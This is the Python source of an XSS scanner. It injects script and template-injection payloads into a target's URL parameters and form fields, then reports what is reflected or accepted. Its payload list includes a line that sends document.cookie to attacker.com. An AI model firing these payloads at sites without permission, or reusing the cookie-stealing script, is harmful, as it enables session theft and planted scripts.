"""
GLITCHICONS ⬡ — XSS Tester v1.0
Tests: reflected, stored, DOM-based XSS
"""
import requests
import sys
import time
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.panel import Panel

console = Console()

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "<script>document.location='http://attacker.com/'+document.cookie</script>",
]

def test_reflected_xss(url, params=None, cookies=None, delay=0.5):
    """Test reflected XSS on GET parameters."""
    console.print(f"\n[bold]→ Reflected XSS[/bold]: {url}")
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    findings = []
    if not params:
        # Auto-detect params from URL
        from urllib.parse import urlparse, parse_qs
        parsed  = urlparse(url)
        params  = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    else:
        base_url = url

    if not params:
        console.print("  [dim]No parameters to test[/dim]")
        return findings

    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                r = session.get(
                    base_url, params=test_params,
                    timeout=10, verify=False
                )
                if payload in r.text:
                    console.print(
                        f"  [red]⚠ REFLECTED: param={param} "
                        f"payload={payload[:30]}[/red]"
                    )
                    findings.append({
                        "type"   : "REFLECTED_XSS",
                        "param"  : param,
                        "payload": payload,
                        "url"    : r.url,
                        "status" : r.status_code,
                    })
                    break  # Found for this param, move on
                time.sleep(delay)
            except Exception:
                continue

    if not findings:
        console.print("  [green]No reflected XSS found[/green]")
    return findings


def test_stored_xss(url, fields=None, cookies=None,
                    headers=None, delay=0.5):
    """Test stored XSS via POST forms."""
    console.print(f"\n[bold]→ Stored XSS[/bold]: {url}")
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)
    if headers:
        session.headers.update(headers)

    findings = []
    if not fields:
        fields = {"comment": "", "message": "",
                  "content": "", "description": ""}

    for field in fields:
        for payload in XSS_PAYLOADS[:5]:
            test_data = fields.copy()
            test_data[field] = payload
            try:
                r = session.post(
                    url, data=test_data,
                    timeout=10, verify=False
                )
                if r.status_code in [200, 201, 302]:
                    console.print(
                        f"  [yellow]Submitted: field={field} "
                        f"status={r.status_code}[/yellow]"
                    )
                    findings.append({
                        "type"   : "STORED_XSS_SUBMITTED",
                        "field"  : field,
                        "payload": payload,
                        "status" : r.status_code,
                        "note"   : "Verify manually if stored"
                    })
                time.sleep(delay)
            except Exception:
                continue

    return findings


def run(url, mode="reflected", cookies=None,
        params=None, output_dir=None):
    """Run XSS test suite."""
    console.print(Panel(
        "[bold purple]⬡ GLITCHICONS XSS TESTER[/bold purple]\n"
        f"[dim]Target: {url}[/dim]\n"
        f"[dim]Mode  : {mode}[/dim]",
        border_style="purple"
    ))

    import warnings
    warnings.filterwarnings("ignore")

    findings = []
    if mode in ["reflected", "all"]:
        findings += test_reflected_xss(
            url, params=params, cookies=cookies
        )
    if mode in ["stored", "all"]:
        findings += test_stored_xss(url, cookies=cookies)

    # Save
    if output_dir and findings:
        import json
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        f   = out / f"xss_findings_{ts}.json"
        f.write_text(json.dumps(findings, indent=2))
        console.print(f"\nReport: {f}")

    console.print(f"\n[bold]Total: {len(findings)} XSS findings[/bold]")
    return findings


if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else "https://target.example.com")
